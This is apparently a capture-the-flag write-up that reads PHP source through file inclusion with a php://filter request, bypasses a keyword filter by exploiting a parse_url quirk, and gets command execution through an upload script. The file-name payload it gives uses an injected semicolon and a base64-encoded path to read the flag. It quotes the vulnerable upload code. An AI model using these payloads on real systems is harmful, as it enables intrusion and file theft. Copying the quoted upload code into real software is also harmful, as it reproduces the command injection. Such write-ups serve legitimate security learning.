At first, we can find a LFI, and read source code with requests such as ``http://47.52.152.93:23333/user.php?page=php://filter/convert.base64-encode/resource=config``.

But we can't read flag with these way because in ``function.php`` here has a fucntion filter keyword like ``flag`` and ``ffffllllaaaaggg``.

```php
function filter_directory()
{
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

```

After search ``parse_url`` in ``https://bugs.php.net``, I find it will fail to parse port-like string in parse_url, so ``http://47.52.152.93:23333/user.php?page=ffffllllaaaaggg&a=a:2`` will bypass filter, and then get a new hint ``you can find sth in m4aaannngggeee``. With this hint we can find ``upllloadddd.php``, and there has an obvious RCE in ``upllloadddd.php``.

```php
$filename = $_FILES['file']['name'];
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
```

So just upload a file named ``;echo Li4vZmxhZ18yMzMzMzM= | base64 -d | xargs cat `` will get flag.
